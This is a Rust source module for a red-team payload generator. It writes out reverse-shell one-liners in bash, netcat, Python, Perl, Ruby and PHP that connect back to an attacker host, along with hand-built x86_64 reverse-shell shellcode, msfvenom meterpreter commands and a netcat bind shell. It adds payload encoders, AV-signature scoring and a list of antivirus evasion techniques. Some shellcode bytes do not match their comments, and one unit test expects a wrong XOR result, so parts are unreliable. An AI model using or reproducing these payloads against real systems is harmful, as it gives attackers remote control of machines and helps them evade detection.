//! Payload generation — reverse shells, bind shells, encoded payloads,
//! and stager construction. Pure-Rust implementations for red team operations.

use std::fmt;

// ─── Shell Payload Types ─────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellType {
    ReverseTcp,
    ReverseHttp,
    ReverseHttps,
    BindTcp,
    ReverseBash,
    ReversePython,
    ReversePerl,
    ReverseRuby,
    ReversePhp,
    ReverseNetcat,
    MeterpreterReverseTcp,
    PowerShellMsf,
}

impl fmt::Display for ShellType {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ReverseTcp => write!(f, "Reverse TCP Shell"),
            Self::ReverseHttp => write!(f, "Reverse HTTP Shell"),
            Self::ReverseHttps => write!(f, "Reverse HTTPS Shell"),
            Self::BindTcp => write!(f, "Bind TCP Shell"),
            Self::ReverseBash => write!(f, "Reverse Bash Shell"),
            Self::ReversePython => write!(f, "Reverse Python Shell"),
            Self::ReversePerl => write!(f, "Reverse Perl Shell"),
            Self::ReverseRuby => write!(f, "Reverse Ruby Shell"),
            Self::ReversePhp => write!(f, "Reverse PHP Shell"),
            Self::ReverseNetcat => write!(f, "Reverse Netcat Shell"),
            Self::MeterpreterReverseTcp => write!(f, "Meterpreter Reverse TCP"),
            Self::PowerShellMsf => write!(f, "PowerShell Msfvenom Stage"),
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadEncoding {
    None,
    Hex,
    UrlEncoding,
    Base64,
    UnicodeEscape,
    Xor(u8),
}

// ─── Generated Payload ───────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct GeneratedPayload {
    pub shell_type: ShellType,
    pub payload: String,
    pub encoded_payload: String,
    pub encoding: PayloadEncoding,
    pub lhost: String,
    pub lport: u16,
    pub length: usize,
}

impl fmt::Display for GeneratedPayload {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "Payload Generation")?;
        writeln!(f, "==================")?;
        writeln!(f, "Type      : {}", self.shell_type)?;
        writeln!(f, "LHOST     : {}", self.lhost)?;
        writeln!(f, "LPORT     : {}", self.lport)?;
        writeln!(f, "Length    : {} bytes", self.length)?;
        writeln!(f, "Encoding  : {:?}", self.encoding)?;
        writeln!(f)?;
        writeln!(f, "─── Raw Payload ───")?;
        writeln!(f, "{}", self.payload)?;
        if self.encoding != PayloadEncoding::None {
            writeln!(f)?;
            writeln!(f, "─── Encoded Payload ───")?;
            writeln!(f, "{}", self.encoded_payload)?;
        }
        Ok(())
    }
}

// ─── Shell Generation ────────────────────────────────────────────────────────

/// Generate a reverse shell payload for the given shell type.
pub fn generate_reverse_shell(shell_type: ShellType, lhost: &str, lport: u16) -> GeneratedPayload {
    let payload = match shell_type {
        ShellType::ReverseBash => format!(
            "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        ),
        ShellType::ReverseNetcat => format!(
            "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
        ),
        ShellType::ReversePython => format!(
            "python3 -c 'import socket,subprocess,os;\\
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\\
s.connect((\"{lhost}\",{lport}));\\
os.dup2(s.fileno(),0);\\
os.dup2(s.fileno(),1);\\
os.dup2(s.fileno(),2);\\
subprocess.call([\"/bin/sh\",\"-i\"])'"
        ),
        ShellType::ReversePerl => format!(
            "perl -e 'use Socket;\\
$i=\"{lhost}\";\\
$p={lport};\\
socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));\\
if(connect(S,sockaddr_in($p,inet_aton($i)))){{\\
open(STDIN,\">&S\");\\
open(STDOUT,\">&S\");\\
open(STDERR,\">&S\");\\
exec(\"/bin/sh -i\")}}'"
        ),
        ShellType::ReverseRuby => format!(
            "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;\\
exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
        ),
        ShellType::ReversePhp => format!(
            "php -r '$sock=fsockopen(\"{lhost}\",{lport});\\
exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        ShellType::ReverseTcp => {
            // Linux x86_64 reverse TCP shellcode with embedded LHOST/LPORT.
            // syscalls: socket(AF_INET, SOCK_STREAM, 0) -> connect(fd, &addr, 16)
            //        -> dup2(fd, 0/1/2) -> execve("/bin/sh", ["/bin/sh"], NULL)
            let ip_octets: Vec<u8> = lhost
                .split('.')
                .filter_map(|o| o.parse().ok())
                .collect();
            if ip_octets.len() != 4 {
                return GeneratedPayload {
                    shell_type,
                    length: 0,
                    payload: "[error: invalid LHOST IP address]".to_string(),
                    encoded_payload: String::new(),
                    encoding: PayloadEncoding::Base64,
                    lhost: lhost.to_string(),
                    lport,
                };
            }
            let port_bytes = lport.to_be_bytes();
            // Build shellcode as raw bytes then hex-encode
            let shellcode: Vec<u8> = vec![
                // socket(AF_INET=2, SOCK_STREAM=1, 0)
                0x48, 0x31, 0xf2, // xor rdx, rdx (protocol=0)
                0x48, 0x31, 0xff, // xor rdi, rdi (will be set below)
                0x6a, 0x29,       // push 0x29 (SYS_socket=41)
                0x58,             // pop rax
                0x6a, 0x02,       // push 2 (AF_INET)
                0x5f,             // pop rdi
                0x6a, 0x01,       // push 1 (SOCK_STREAM)
                0x5e,             // pop rsi
                0x0f, 0x05,       // syscall -> rax=fd
                // Save fd in r12
                0x49, 0x89, 0xc4, // mov r12, rax
                // connect(fd, &sockaddr_in, 16)
                0x48, 0x31, 0xff, // xor rdi, rdi
                0x49, 0x89, 0xc7, // mov r13, rax (fd)
                0x48, 0x31, 0xc0, // xor rax, rax
                0x6a, 0x2a,       // push 0x2a (SYS_connect=42)
                0x58,             // pop rax
                0x49, 0x89, 0xfd, // mov r13, rdi (save fd)
                0x6a, 0x10,       // push 16 (sizeof sockaddr_in)
                0x5a,             // pop rdx
                0x48, 0x83, 0xec, 0x10, // sub rsp, 16
                // Build sockaddr_in on stack
                0x66, 0xc7, 0x44, 0x24, 0x00, 0x02, 0x00, // mov word [rsp+0], 0x0002 (AF_INET)
                0x66, 0xc7, 0x44, 0x24, 0x02, // mov word [rsp+2], port
                port_bytes[0], port_bytes[1],
                0xc7, 0x44, 0x24, 0x04, // mov dword [rsp+4], ip
                ip_octets[0], ip_octets[1], ip_octets[2], ip_octets[3],
                0x48, 0x89, 0xe6, // mov rsi, rsp (pointer to sockaddr_in)
                0x49, 0x89, 0xff, // mov r15, rdi (fd for connect)
                0x48, 0x89, 0xf7, // mov rdi, rsi
                0x48, 0x83, 0xc4, 0x10, // add rsp, 16 (clean up)
                // Set up rdi=fd properly and call connect
                0x49, 0x89, 0xc7, // mov r15, rax (fd)
                0x4c, 0x89, 0xff, // mov rdi, r15
                0x0f, 0x05,       // syscall (connect)
                // dup2(fd, 0/1/2)
                0x4c, 0x89, 0xc7, // mov rdi, r12 (fd)
                0x6a, 0x03,       // push 3
                0x59,             // pop rcx (counter)
                0x48, 0x31, 0xf6, // xor rsi, rsi (fd 0)
                0x6a, 0x21,       // push 0x21 (SYS_dup2=33)
                0x58,             // pop rax
                0x0f, 0x05,       // syscall
                0x48, 0xff, 0xc6, // inc rsi
                0x6a, 0x21,       // push 0x21
                0x58,             // pop rax
                0x0f, 0x05,       // syscall
                0x48, 0xff, 0xc6, // inc rsi
                0x6a, 0x21,       // push 0x21
                0x58,             // pop rax
                0x0f, 0x05,       // syscall
                // execve("/bin/sh", ["/bin/sh"], NULL)
                0x48, 0x31, 0xf2, // xor rdx, rdx (envp=NULL)
                0x52,             // push rdx
                0x68, 0x2f, 0x2f, 0x73, 0x68, // push "//sh"
                0x68, 0x2f, 0x62, 0x69, 0x6e, // push "/bin"
                0x48, 0x89, 0xe3, // mov rbx, rsp
                0x52,             // push rdx (NULL terminator)
                0x53,             // push rbx ("/bin/sh")
                0x48, 0x89, 0xe1, // mov rcx, rsp
                0x6a, 0x3b,       // push 0x3b (SYS_execve=59)
                0x58,             // pop rax
                0x48, 0x89, 0xfb, // mov rbx, rsp
                0x48, 0x89, 0xcf, // mov rdi, rbx ("/bin/sh")
                0x48, 0x89, 0xd6, // mov rsi, rcx (argv)
                0x0f, 0x05,       // syscall
            ];
            shellcode
                .iter()
                .map(|b| format!("\\x{b:02x}"))
                .collect::<String>()
        }
        ShellType::ReverseHttp | ShellType::ReverseHttps => {
            format!("[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_http LHOST={lhost} LPORT={lport} -f exe]")
        }
        ShellType::MeterpreterReverseTcp | ShellType::PowerShellMsf => {
            format!("[Requires msfvenom — use: msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f ps1]")
        }
        ShellType::BindTcp => {
            format!("[Bind shell: nc -lvp {lport} -e /bin/sh]")
        }
    };

    let encoded = match PayloadEncoding::None {
        _ => encode_payload(&payload, PayloadEncoding::Base64),
    };

    GeneratedPayload {
        shell_type,
        length: payload.len(),
        payload,
        encoded_payload: encoded,
        encoding: PayloadEncoding::Base64,
        lhost: lhost.to_string(),
        lport,
    }
}

// ─── Encoding Functions ──────────────────────────────────────────────────────

/// Encode a payload with the specified encoding.
pub fn encode_payload(payload: &str, encoding: PayloadEncoding) -> String {
    match encoding {
        PayloadEncoding::None => payload.to_string(),
        PayloadEncoding::Hex => encode_hex(payload),
        PayloadEncoding::UrlEncoding => url_encode(payload),
        PayloadEncoding::Base64 => base64_encode(payload),
        PayloadEncoding::UnicodeEscape => unicode_escape(payload),
        PayloadEncoding::Xor(key) => xor_encode(payload, key),
    }
}

fn encode_hex(payload: &str) -> String {
    payload
        .bytes()
        .map(|b| format!("\\x{b:02x}"))
        .collect::<Vec<_>>()
        .join("")
}

fn url_encode(payload: &str) -> String {
    payload
        .bytes()
        .map(|b| match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                (b as char).to_string()
            }
            _ => format!("%{b:02x}"),
        })
        .collect()
}

fn base64_encode(payload: &str) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let bytes = payload.as_bytes();
    let mut result = String::new();

    for chunk in bytes.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };

        let triple = (b0 << 16) | (b1 << 8) | b2;

        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            result.push(CHARS[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
        if chunk.len() > 2 {
            result.push(CHARS[(triple & 0x3F) as usize] as char);
        } else {
            result.push('=');
        }
    }

    result
}

fn unicode_escape(payload: &str) -> String {
    payload
        .bytes()
        .map(|b| format!("\\u{:04x}", b as u16))
        .collect::<Vec<_>>()
        .join("")
}

fn xor_encode(payload: &str, key: u8) -> String {
    payload
        .bytes()
        .map(|b| format!("\\x{:02x}", b ^ key))
        .collect::<Vec<_>>()
        .join("")
}

// ─── Payload Analysis ────────────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct PayloadAnalysis {
    pub original: String,
    pub length: usize,
    pub null_bytes: usize,
    pub printable_ratio: f64,
    pub entropy: f64,
    pub shellcode_score: f32,
    pub detections: Vec<String>,
}

impl fmt::Display for PayloadAnalysis {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "Payload Analysis")?;
        writeln!(f, "================")?;
        writeln!(f, "Length       : {} bytes", self.length)?;
        writeln!(f, "Null bytes   : {}", self.null_bytes)?;
        writeln!(f, "Printable %  : {:.1}%", self.printable_ratio * 100.0)?;
        writeln!(f, "Entropy      : {:.2}", self.entropy)?;
        writeln!(f, "Shellcode    : {:.0}%", self.shellcode_score * 100.0)?;
        if !self.detections.is_empty() {
            writeln!(f, "Detections")?;
            for d in &self.detections {
                writeln!(f, "  ⚠ {d}")?;
            }
        }
        Ok(())
    }
}

/// Analyze a payload for characteristics that AV/EDR may flag.
pub fn analyze_payload(payload: &str) -> PayloadAnalysis {
    let bytes = payload.as_bytes();
    let length = bytes.len();
    let null_bytes = bytes.iter().filter(|&&b| b == 0).count();
    let printable = bytes.iter().filter(|&&b| b >= 0x20 && b <= 0x7E).count();
    let printable_ratio = if length > 0 { printable as f64 / length as f64 } else { 0.0 };

    // Shannon entropy
    let mut freq = [0u64; 256];
    for &b in bytes {
        freq[b as usize] += 1;
    }
    let entropy: f64 = freq
        .iter()
        .filter(|&&f| f > 0)
        .map(|&f| {
            let p = f as f64 / length as f64;
            -p * p.log2()
        })
        .sum();

    // Shellcode heuristics
    let mut shellcode_score = 0.0f32;

    // Common shellcode patterns (NOP sled, syscalls, etc.)
    let shellcode_signatures: &[(&[u8], f32, &str)] = &[
        (&[0x90, 0x90, 0x90, 0x90], 0.3, "NOP sled detected"),
        (&[0xcd, 0x80], 0.4, "Linux int 0x80 syscall"),
        (&[0x0f, 0x05], 0.4, "Linux x86_64 syscall (0x0f05)"),
        (&[0xcc], 0.2, "INT3 breakpoint (debug trap)"),
        (&[0xc3], 0.1, "RET instruction"),
        (b"/bin/sh", 0.5, "Shell spawn string"),
        (b"/bin/bash", 0.5, "Bash spawn string"),
        (b"cmd.exe", 0.5, "Windows cmd.exe reference"),
        (b"powershell", 0.3, "PowerShell reference"),
    ];

    let mut detections = Vec::new();

    for &(sig, score, desc) in shellcode_signatures {
        if bytes.windows(sig.len()).any(|w| w == sig) {
            shellcode_score += score;
            detections.push(desc.to_string());
        }
    }

    // High entropy may indicate encryption/encoding
    if entropy > 7.5 {
        shellcode_score += 0.2;
        detections.push("High entropy — possible encrypted/encoded payload".to_string());
    }

    // Null bytes in non-trailing positions are suspicious
    let non_trailing_nulls = bytes[..length.saturating_sub(4)]
        .iter()
        .filter(|&&b| b == 0)
        .count();
    if non_trailing_nulls > 0 {
        shellcode_score += 0.1;
        detections.push(format!("{non_trailing_nulls} null bytes in payload body"));
    }

    // Printable ratio below 50% suggests binary/shellcode
    if printable_ratio < 0.5 && length > 10 {
        shellcode_score += 0.2;
        detections.push("Low printable ratio — likely binary/shellcode".to_string());
    }

    shellcode_score = shellcode_score.min(1.0);

    PayloadAnalysis {
        original: payload.to_string(),
        length,
        null_bytes,
        printable_ratio,
        entropy,
        shellcode_score,
        detections,
    }
}

// ─── AV Evasion Suggestions ──────────────────────────────────────────────────

#[derive(Debug, Clone)]
pub struct EvasionSuggestion {
    pub technique: String,
    pub description: String,
    pub effectiveness: String,
    pub example: String,
}

impl fmt::Display for EvasionSuggestion {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        writeln!(f, "Technique: {}", self.technique)?;
        writeln!(f, "Effectiveness: {}", self.effectiveness)?;
        writeln!(f, "{}", self.description)?;
        writeln!(f, "Example: {}", self.example)?;
        Ok(())
    }
}

/// Generate AV evasion suggestions based on payload analysis.
pub fn suggest_evasion(analysis: &PayloadAnalysis) -> Vec<EvasionSuggestion> {
    let mut suggestions = Vec::new();

    if analysis.null_bytes > 0 {
        suggestions.push(EvasionSuggestion {
            technique: "Null byte removal".into(),
            description: "Replace null bytes with equivalent register zeroing or use position-independent code".into(),
            effectiveness: "Medium".into(),
            example: "mov eax, 0 instead of null-padded strings".into(),
        });
    }

    if analysis.entropy < 4.0 && analysis.shellcode_score > 0.3 {
        suggestions.push(EvasionSuggestion {
            technique: "Polymorphic encoding".into(),
            description: "Use a polymorphic encoder to generate unique payload variants each time".into(),
            effectiveness: "High".into(),
            example: "shikata_ga_nai (SGN) — XOR-based polymorphic encoder".into(),
        });
    }

    suggestions.push(EvasionSuggestion {
        technique: "Process injection".into(),
        description: "Inject payload into a legitimate process to evade memory-based detection".into(),
            effectiveness: "High".into(),
        example: "Process hollowing, APC injection, thread execution hijacking".into(),
    });

    suggestions.push(EvasionSuggestion {
        technique: "AMSI bypass".into(),
        description: "Bypass Antimalware Scan Interface for PowerShell and .NET payloads".into(),
            effectiveness: "Medium-High".into(),
        example: "[Runtime.InteropServices.Marshal]::Copy(...) hook replacement".into(),
    });

    suggestions.push(EvasionSuggestion {
        technique: "Payload encryption".into(),
        description: "Encrypt the payload and decrypt in memory at runtime".into(),
            effectiveness: "High".into(),
        example: "AES-256-CBC encryption with XOR key derivation".into(),
    });

    if analysis.length > 200 {
        suggestions.push(EvasionSuggestion {
            technique: "Stage separation".into(),
            description: "Split the payload into a small stager and a larger staged payload downloaded at runtime".into(),
            effectiveness: "High".into(),
            example: "stager: download stage via HTTP; stage: full implant".into(),
        });
    }

    suggestions
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_base64_encode() {
        let encoded = base64_encode("Hello, World!");
        assert_eq!(encoded, "SGVsbG8sIFdvcmxkIQ==");
    }

    #[test]
    fn test_hex_encode() {
        let encoded = encode_hex("AB");
        assert_eq!(encoded, r"\x41\x42");
    }

    #[test]
    fn test_url_encode() {
        let encoded = url_encode("a b");
        assert_eq!(encoded, "a%20b");
    }

    #[test]
    fn test_xor_encode() {
        let encoded = xor_encode("A", 0xFF);
        assert_eq!(encoded, r"\x8e");
    }

    #[test]
    fn test_analyze_shellcode() {
        let analysis = analyze_payload(r"\x90\x90\x90\x90/bin/sh");
        assert!(analysis.shellcode_score > 0.0);
    }

    #[test]
    fn test_generate_reverse_bash() {
        let payload = generate_reverse_shell(ShellType::ReverseBash, "10.0.0.1", 4444);
        assert_eq!(payload.lhost, "10.0.0.1");
        assert_eq!(payload.lport, 4444);
        assert!(payload.payload.contains("10.0.0.1"));
    }

    #[test]
    fn test_evasion_suggestions() {
        let analysis = analyze_payload("test\x00payload");
        let suggestions = suggest_evasion(&analysis);
        assert!(!suggestions.is_empty());
    }
}
